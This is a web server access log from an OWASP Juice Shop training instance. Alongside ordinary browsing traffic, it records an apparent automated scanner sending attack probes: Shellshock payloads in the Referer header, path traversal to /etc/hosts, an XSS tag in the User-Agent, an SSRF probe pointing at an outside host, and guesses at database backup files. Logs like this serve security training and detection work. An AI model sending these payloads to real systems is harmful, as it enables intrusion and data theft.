213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
213.24.135.137 - - [04/Aug/2025:04:32:07 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
2001:ee0:8209:632:69fa:39ee:74cd:7e3a - - [04/Aug/2025:04:32:07 +0000] "GET /FUZZ/socket.io/?EIO=4&transport=polling&t=PXpMU8A HTTP/1.1" 200 - "https://demo.owasp-juice.shop/FUZZ" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /rest/admin/application-version HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:08 +0000] "GET /server-status HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /api/Challenges/?name=Score%20Board HTTP/1.1" 200 695 "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /rest/languages HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /api/Quantitys/ HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:08 +0000] "GET /stronghold-info HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /rest/products/search?q= HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /rest/admin/application-version HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:08 +0000] "GET /stronghold-status HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /api/Challenges/?name=Score%20Board HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.204.189.218 - - [04/Aug/2025:04:32:08 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:08 +0000] "GET /perl-status HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:09 +0000] "GET /assets/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:10 +0000] "GET /assets/public/images/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:10 +0000] "GET /app/node_modules/express-jwt/lib/index.js:40:9 HTTP/1.1" 200 80117 "https://demo.owasp-juice.shop/rest/basket" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:10 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:10 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:10 +0000] "GET /app/node_modules/morgan/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:10 +0000] "GET /api/Feedbacks/ HTTP/1.1" 200 1734 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:10 +0000] "POST /rest/user/login HTTP/1.1" 200 832 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
111.223.186.144 - - [04/Aug/2025:04:32:11 +0000] "GET /orders/socket.io/?EIO=4&transport=polling&t=PXpMV1U HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/orders" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:13 +0000] "GET /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/hosts HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:13 +0000] "GET /Account/Register.aspx?ReturnUrl= HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:13 +0000] "GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://bxss.me/t/fit.txt HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:13 +0000] "GET /+CSCOU+/../+CSCOE+/files/file_list.json HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:13 +0000] "GET /cgi-bin/welcome.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:13 +0000] "GET /cgi-bin/jarrewrite.sh HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:13 +0000] "GET /ClientAccessPolicy.xml HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /ClientAccessPolicy.xml HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /cgi-bin/welcome HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /inexistent_file_name.inexistent0123450987.cfm HTTP/1.1" 200 - "-" "<script>alert(12345)</script>"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /S2JXX0XdAd.cfm HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /administrator.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /solr/select/?q=test HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /admin.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /qEuFU6Sr HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
2001:ee0:8209:632:69fa:39ee:74cd:7e3a - - [04/Aug/2025:04:32:14 +0000] "GET /FUZZ/socket.io/?EIO=4&transport=polling&t=PXpMVby HTTP/1.1" 200 - "https://demo.owasp-juice.shop/FUZZ" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /cgi-bin/admin.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /crossdomain.xml HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /db.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:14 +0000] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /dump.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /admin/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
203.56.145.104 - - [04/Aug/2025:04:32:15 +0000] "GET /rest/admin/application-version HTTP/1.1" 200 20 "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /dbdump.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
203.56.145.104 - - [04/Aug/2025:04:32:15 +0000] "GET /rest/languages HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15"
203.56.145.104 - - [04/Aug/2025:04:32:15 +0000] "GET /api/Quantitys/ HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /database.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
203.56.145.104 - - [04/Aug/2025:04:32:15 +0000] "GET /rest/products/search?q= HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /cgi-bin/search.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /backup.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /juice.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:15 +0000] "GET /cgi-sys/addalink.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
203.56.145.104 - - [04/Aug/2025:04:32:15 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15"
213.24.135.137 - - [04/Aug/2025:04:32:15 +0000] "GET /rest/admin/application-configuration HTTP/1.1" 304 - "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 YaBrowser/25.6.0.0 Safari/537.36"
203.56.145.104 - - [04/Aug/2025:04:32:15 +0000] "GET /api/Challenges/?name=Score%20Board HTTP/1.1" 200 695 "https://juice-shop.herokuapp.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15"
34.136.217.65 - - [04/Aug/2025:04:32:15 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /juicedb.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /cgi-sys/entropybanner.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /juice_db.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /juice-db.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /juice_database.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /cgi-sys/FormMail-clone.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:16 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:16 +0000] "GET /assets/public/images/ HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /juice-database.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:16 +0000] "GET /cgi-sys/domainredirect.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:16 +0000] "GET /app/node_modules/express/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /juice_dump.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /cgi-mod/index.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:17 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /juice-dump.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /juice_backup.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /cgi-bin-sdb/printenv HTTP/1.1" 200 - "() { Referer; }; echo -e "Content-Type: text/plain\n"; echo -e "\0141\0143\0165\0156\0145\0164\0151\0170\0163\0150\0145\0154\0154\0163\0150\0157\0143\0153"" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:17 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /juice-backup.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /elmah.axd HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
111.223.186.144 - - [04/Aug/2025:04:32:17 +0000] "GET /orders/socket.io/?EIO=4&transport=polling&t=PXpMWVE HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/orders" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /backup-juice.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:17 +0000] "GET /admin/elmah.axd HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /backup_juice.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /xHlPxwmspj HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /juice-shop.herokuapp.com.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /xHlPxwmspj.php HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
